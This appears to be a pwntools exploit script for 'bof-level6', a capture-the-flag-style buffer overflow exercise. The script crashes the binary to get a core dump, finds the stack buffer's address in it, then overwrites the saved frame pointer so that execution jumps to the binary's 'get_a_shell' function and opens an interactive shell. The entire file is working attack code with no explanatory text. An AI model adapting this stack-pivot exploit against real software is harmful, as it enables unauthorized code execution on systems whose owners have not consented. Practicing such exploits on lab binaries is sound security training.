from pwn import *

# Set up attack
p = process("./bof-level6")
e = ELF("./bof-level6")

# Need to change ending address to start of buffer
# Find by inspecting core file and finding the 78's

# Create a core file by making a segfault
prog_input = p64(0x7878787878787878) + (p64(e.symbols['get_a_shell'])) + (112 * 'a') + p64(0x7fffffffe2e0)
p.sendline(prog_input)
p.wait()

# Find buffer in core file
c = Core('./core')
buff = c.stack.find(prog_input)

# Send the correct attack where ebp becomes the start of the buffer and new_ebp+8 is get a shells address
prog_input = p64(0x7878787878787878) + (p64(e.symbols['get_a_shell'])) + (112 * 'a') + p64(buff)
p = process("./bof-level6")
p.sendline(prog_input)
p.interactive()
